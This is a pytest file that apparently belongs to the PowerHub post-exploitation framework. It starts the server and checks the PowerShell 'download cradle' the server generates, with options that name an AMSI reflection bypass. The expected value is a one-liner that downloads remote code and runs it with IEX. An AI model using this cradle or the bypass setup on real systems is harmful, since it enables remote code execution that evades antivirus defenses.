#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
from subprocess import check_output
from shlex import split
#  import tempfile
#  import re
import requests

import pytest

# https://stackoverflow.com/a/33515264/1308830
sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
from test_init import TEST_URI, TEST_COMMANDS, init_tests  # noqa


init_tests()


def get_stager():
    result = []
    PORT = '8080'
    param_set = {
        'default': {
            "flavor": "hub",
            "GroupLauncher": "powershell",
            "GroupAmsi": "reflection",
            "GroupTransport": "http",
            "GroupClipExec": "none",
            "CheckboxProxy": "false",
            "CheckboxTLS1.2": "false",
            "RadioFingerprint": "true",
            "RadioNoVerification": "false",
            "RadioCertStore": "false",
        }
    }
    r = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
                     params=param_set['default'])
    result += [r.text]
    return result


def execute_cradle():
    return check_output(split())[:-1].decode()


@pytest.fixture
def full_app():
    from powerhub import powerhub
    from powerhub import reverseproxy
    powerhub.main(fully_threaded=True)
    # Wait til app is ready
    time.sleep(5)
    yield get_stager()
    reverseproxy.reactor.stop()


def test_stager(full_app):
    assert full_app[0] == ("$K=New-Object Net.WebClient;IEX "
                           + f"$K.DownloadString('http://{TEST_URI}:8080"
                           + "/0?t=http&f=h&a=reflection');"
                           )
